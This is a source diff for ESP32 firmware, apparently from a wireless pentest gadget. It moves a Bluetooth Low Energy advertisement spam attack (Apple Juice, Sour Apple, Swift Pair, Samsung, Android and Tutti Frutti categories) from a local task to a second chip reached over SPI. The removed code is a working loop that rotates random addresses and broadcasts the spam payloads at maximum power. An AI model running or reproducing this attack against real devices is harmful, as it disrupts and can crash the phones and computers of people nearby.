@@ -23,16 +23,9 @@
  */
 
 #include "canned_spam.h"
-#include "apple_juice_spam.h"
-#include "sour_apple_spam.h"
-#include "swift_pair_spam.h"
-#include "samsung_spam.h"
-#include "android_spam.h"
-#include "tutti_frutti_spam.h"
 #include "bluetooth_service.h"
-#include "host/ble_hs.h"
-#include "host/ble_gap.h"
-#include "host/ble_hs_id.h"
+#include "spi_bridge.h"
+#include "spi_protocol.h"
 #include "esp_log.h"
 #include <string.h>
 
@@ -59,75 +52,6 @@ static const SpamType category_info[] = {
 
 static bool spam_running = false;
 static int current_category = -1;
-static TaskHandle_t spam_task_handle = NULL;
-
-
-static void spam_task(void *pvParameters) {
-  ESP_LOGI(TAG, "Spam Task Started for category %d", current_category);
-
-  struct ble_gap_adv_params adv_params;
-  memset(&adv_params, 0, sizeof(adv_params));
-  adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
-  adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;
-  adv_params.itvl_min = 32; // 20ms
-  adv_params.itvl_max = 48; // 30ms
-
-  uint8_t payload_buffer[32];
-
-  while (spam_running) {
-    int payload_len = 0;
-
-    switch (current_category) {
-      case CAT_APPLE_JUICE:
-        payload_len = generate_apple_juice_payload(payload_buffer, sizeof(payload_buffer));
-        break;
-      case CAT_SOUR_APPLE:
-        payload_len = generate_sour_apple_payload(payload_buffer, sizeof(payload_buffer));
-        break;
-      case CAT_SWIFT_PAIR:
-        payload_len = generate_swift_pair_payload(payload_buffer, sizeof(payload_buffer));
-        break;
-      case CAT_SAMSUNG:
-        payload_len = generate_samsung_payload(payload_buffer, sizeof(payload_buffer));
-        break;
-      case CAT_ANDROID:
-        payload_len = generate_android_payload(payload_buffer, sizeof(payload_buffer));
-        break;
-      case CAT_TUTTI_FRUTTI:
-        payload_len = generate_tutti_frutti_payload(payload_buffer, sizeof(payload_buffer));
-        break;
-      default:
-        payload_len = 0;
-        break;
-    }
-
-    if (payload_len <= 0) {
-      vTaskDelay(pdMS_TO_TICKS(10));
-      continue;
-    }
-
-    ble_addr_t rnd_addr;
-    ble_hs_id_gen_rnd(0, &rnd_addr);
-    ble_hs_id_set_rnd(rnd_addr.val);
-
-    int rc = ble_gap_adv_set_data(payload_buffer, payload_len);
-    if (rc != 0) {}
-
-    rc = ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER, &adv_params, NULL, NULL);
-
-    // wait loop delay
-    vTaskDelay(pdMS_TO_TICKS(150));
-
-    ble_gap_adv_stop();
-
-    vTaskDelay(pdMS_TO_TICKS(50));
-  }
-
-  spam_task_handle = NULL;
-  vTaskDelete(NULL);
-}
-
-
 
 int spam_get_attack_count(void) {
   return CAT_COUNT;
@@ -154,15 +78,21 @@ esp_err_t spam_start(int attack_index) {
     return ESP_ERR_NOT_FOUND;
   }
 
-  bluetooth_service_stop_advertising();
+  uint8_t payload = (uint8_t)attack_index;
+  spi_header_t resp_hdr;
+  uint8_t resp_buf[SPI_MAX_PAYLOAD];
 
-  // Garante potência máxima para o spam ir mais longe
-  bluetooth_service_set_max_power();
+  esp_err_t ret = spi_bridge_send_command(SPI_ID_BT_APP_SPAM,
+      &payload, sizeof(payload),
+      &resp_hdr, resp_buf, 5000);
+
+  if (ret != ESP_OK || resp_buf[0] != SPI_STATUS_OK) {
+    ESP_LOGE(TAG, "Failed to start spam on C5");
+    return ESP_FAIL;
+  }
 
   current_category = attack_index;
   spam_running = true;
-
-  xTaskCreate(spam_task, "spam_task", 4096, NULL, 5, &spam_task_handle);
 
   ESP_LOGI(TAG, "Spam started for category: %s", category_info[attack_index].name);
   return ESP_OK;
@@ -173,20 +103,18 @@ esp_err_t spam_stop(void) {
     return ESP_ERR_INVALID_STATE;
   }
 
+  spi_header_t resp_hdr;
+  uint8_t resp_buf[SPI_MAX_PAYLOAD];
+
+  esp_err_t ret = spi_bridge_send_command(SPI_ID_BT_APP_STOP,
+      NULL, 0,
+      &resp_hdr, resp_buf, 2000);
+
+  if (ret != ESP_OK || resp_buf[0] != SPI_STATUS_OK) {
+    ESP_LOGW(TAG, "Failed to stop spam on C5");
+  }
+
   spam_running = false;
-
-  if (spam_task_handle != NULL) {
-    int retry = 10;
-    while (spam_task_handle != NULL && retry > 0) {
-      vTaskDelay(pdMS_TO_TICKS(50));
-      retry--;
-    }
-  }
-
-  if (ble_gap_adv_active()) {
-    ble_gap_adv_stop();
-  }
-
   ESP_LOGI(TAG, "Spam stopped");
   return ESP_OK;
 }
